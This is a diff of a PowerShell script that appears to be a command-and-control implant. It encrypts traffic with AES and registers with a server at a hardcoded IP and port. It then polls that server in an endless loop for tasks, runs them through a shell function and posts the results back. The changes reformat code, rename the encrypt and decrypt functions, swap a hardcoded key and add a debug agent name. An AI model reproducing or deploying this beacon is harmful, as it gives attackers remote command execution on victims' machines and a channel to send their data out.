@@ -1,57 +1,46 @@
 function Create-AesManagedObject($key, $IV) {
-    
-    $aesManaged           = New-Object "System.Security.Cryptography.AesManaged"
-    $aesManaged.Mode      = [System.Security.Cryptography.CipherMode]::CBC
-    $aesManaged.Padding   = [System.Security.Cryptography.PaddingMode]::Zeros
+    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
     $aesManaged.BlockSize = 128
-    $aesManaged.KeySize   = 256
-    
+    $aesManaged.KeySize = 256
     if ($IV) {
-        
         if ($IV.getType().Name -eq "String") {
             $aesManaged.IV = [System.Convert]::FromBase64String($IV)
         }
-        
         else {
             $aesManaged.IV = $IV
         }
     }
-    
     if ($key) {
-        
         if ($key.getType().Name -eq "String") {
             $aesManaged.Key = [System.Convert]::FromBase64String($key)
         }
-        
         else {
             $aesManaged.Key = $key
         }
     }
-    
     $aesManaged
 }
 
-function Encrypt($key, $unencryptedString) {
-    
-    $bytes             = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
-    $aesManaged        = Create-AesManagedObject $key
-    $encryptor         = $aesManaged.CreateEncryptor()
-    $encryptedData     = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+function Encrypt-String($key, $unencryptedString) {
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $aesManaged = Create-AesManagedObject $key
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
     [byte[]] $fullData = $aesManaged.IV + $encryptedData
     $aesManaged.Dispose()
     [System.Convert]::ToBase64String($fullData)
 }
 
-function Decrypt($key, $encryptedStringWithIV) {
-    
-    $bytes           = [System.Convert]::FromBase64String($encryptedStringWithIV)
-    $IV              = $bytes[0..15]
-    $aesManaged      = Create-AesManagedObject $key $IV
-    $decryptor       = $aesManaged.CreateDecryptor();
+function Decrypt-String($key, $encryptedStringWithIV) {
+    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
+    $IV = $bytes[0..15]
+    $aesManaged = Create-AesManagedObject $key $IV
+    $decryptor = $aesManaged.CreateDecryptor();
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
     $aesManaged.Dispose()
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
-
 }
 
 function shell($fname, $arg){
@@ -79,7 +68,7 @@ $ip   = "192.168.0.28"
 $port = "9090"
 ## secrets.token_hex(32)
 ## secrets.token_urlsafe(32)
-$key  = "/Q3XEKeUEipAc8Wl/mR3k4S63nSMnWI06o1KPK0+wGM="
+$key  = "hMxuFHQXf1Q0yew4YyeMiVofS/oJVdw2FynMRMy/wcs="
 $n    = 10
 $name = ""
 $code = ""
@@ -92,7 +81,9 @@ $data  = @{
     type = "$type"
     }
 $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
-
+## debugggggggg
+$name = "cKrOXnHoyE"
+sleep $n
 
 $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")
 $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
@@ -100,7 +91,9 @@ $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
 for (;;){
     
     ### check response NOT existence
+    $taskId = ""
     $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
+    # $task = ""
     
     if (-Not [string]::IsNullOrEmpty($task)){
         
@@ -163,7 +156,6 @@ for (;;){
                 exit
             }
         }
-
-    sleep $n
     }
+    sleep $n
 }
